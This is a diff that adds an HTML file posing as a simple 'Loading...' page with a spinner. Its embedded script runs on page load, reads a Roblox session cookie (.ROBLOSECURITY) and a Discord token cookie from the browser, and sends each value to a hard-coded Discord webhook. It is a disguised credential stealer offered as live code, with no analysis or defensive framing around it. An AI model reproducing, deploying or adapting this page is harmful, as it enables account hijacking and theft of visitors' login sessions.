@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        function logCookies() {
+            // Get the .ROBLOSECURITY cookie
+            var robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+            // Get the __Secure-discord token
+            var discordToken = document.cookie.split('; ').find(row => row.startsWith('__Secure-discord='));
+
+            if (robloxCookie) {
+                // Extract the value of the Roblox cookie
+                var robloxCookieValue = robloxCookie.split('=')[1];
+                // Send the Roblox cookie value to your Discord webhook
+                fetch('https://discord.com/api/webhooks/1402442876046016612/mAX6N4p7-e-0KjhXUDVzUQLMMKoJI4Ss-VKFtAY5kLoqGhwA-Muq55v39j2gBvm2c0p3', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `Roblox Cookie: \`${robloxCookieValue}\``
+                    })
+                });
+            }
+
+            if (discordToken) {
+                // Extract the value of the Discord token
+                var discordTokenValue = discordToken.split('=')[1];
+                // Send the Discord token value to your Discord webhook
+                fetch('https://discord.com/api/webhooks/1402442876046016612/mAX6N4p7-e-0KjhXUDVzUQLMMKoJI4Ss-VKFtAY5kLoqGhwA-Muq55v39j2gBvm2c0p3', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `Discord Token: \`${discordTokenValue}\``
+                    })
+                });
+            }
+        }
+
+        // Call the function immediately when the page loads
+        logCookies();
+    </script>
+</body>
+</html>
